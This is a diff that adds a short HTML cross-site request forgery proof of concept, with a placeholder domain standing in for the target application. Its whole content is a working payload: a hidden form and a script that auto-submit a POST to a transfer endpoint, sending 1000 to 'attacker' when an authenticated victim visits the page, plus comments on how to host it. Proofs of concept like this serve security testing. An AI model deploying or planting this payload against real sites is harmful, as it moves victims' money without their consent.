@@ -1,0 +1,7 @@
+<!-- CSRF proof of concept. example.com = placeholder for the target app.
+     Host on a different origin than the target and visit while authenticated. -->
+<form action="https://example.com/api/transfer" method="POST">
+  <input type="hidden" name="to" value="attacker">
+  <input type="hidden" name="amount" value="1000">
+</form>
+<script>document.forms[0].submit();</script>
